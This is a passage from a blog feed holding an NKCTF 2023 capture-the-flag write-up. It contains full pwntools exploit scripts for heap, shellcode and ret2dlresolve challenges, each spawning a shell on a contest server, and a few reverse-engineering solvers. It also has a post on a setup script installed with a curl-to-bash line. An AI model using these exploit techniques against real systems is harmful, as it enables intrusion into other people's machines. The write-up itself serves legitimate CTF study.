class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank：15&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="nkctf" scheme="https://www.lewiserii.top/tags/nkctf/"/>
    
  </entry>
  
  <entry>
    <title>auto_deploy.sh</title>
    <link href="https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html"/>
    <id>https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html</id>
    <published>2023-02-24T16:30:00.000Z</published>
    <updated>2023-02-28T06:23:27.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="auto-deploy"><a href="#auto-deploy" class="headerlink" title="auto_deploy"></a>auto_deploy</h1><p>一个自动部署Misc工具的<del>轻量</del>sh脚本<br>闲的无聊随便写的小玩意（部分代码由chatgpt完成）<br>适合在新环境中快速搭建misc环境</p><p><a href="https://github.com/lewiserii/auto_deploy">项目地址</a></p><h1 id="目前支持的功能"><a href="#目前支持的功能" class="headerlink" title="目前支持的功能"></a>目前支持的功能</h1><p>1：换源，允许root登录（ubuntu），开启ssh等基础操作<br>2：安装docker<br>3：安装docker-compose<br>4：安装golang<br>5：安装java<br>6：安装linux下的部分misc工具，具体如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs text">binwalk<br>bkcrack<br>blindwatermark<br>cloacked-pixel<br>dtmf2num<br>dwarf2json<br>exif<br>extundelete<br>f5-steganography<br>foremost<br>gaps<br>gnuplot<br>minimodem<br>montage<br>outguess<br>sstv<br>steghide<br>stegpy<br>stegseek<br>volatility2<br>volatility3<br>webp<br>zsteg<br></code></pre></td></tr></table></figure><h1 id="支持的系统"><a href="#支持的系统" class="headerlink" title="支持的系统"></a>支持的系统</h1><p>1：ubuntu16.04&#x2F;18.04&#x2F;20.04&#x2F;22.04<br>2：<del>centos7&#x2F;8</del>(只有部分功能适配了centos)</p><p>推荐ubuntu20</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>本脚本可重复运行安装<br>工具保存在运行脚本的<code>misc_tools</code>目录下</p><p>方法一：<br>git clone <a href="https://github.com/lewiserii/auto_deploy">https://github.com/lewiserii/auto_deploy</a><br>chmod 777 auto_deploy.sh<br>.&#x2F;auto_deploy.sh [mode]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">usage: ./auto_deploy.sh [mode]<br>        basics              基础配置(换源，root，ssh)<br>        docker              安装docker<br>        docker-compoer      安装docker-compose<br>        go                  安装golang<br>        java                安装java<br>        misc-tools          安装misc工具<br></code></pre></td></tr></table></figure><p>方法二：<br>bash &lt;(curl -s <a href="https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh">https://raw.githubusercontent.com/lewiserii/auto_deploy/main/auto_deploy.sh</a>) [mode]</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/auto_deploy/auto_deploy.gif"></p><h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加python安装模块<br>V1.2: 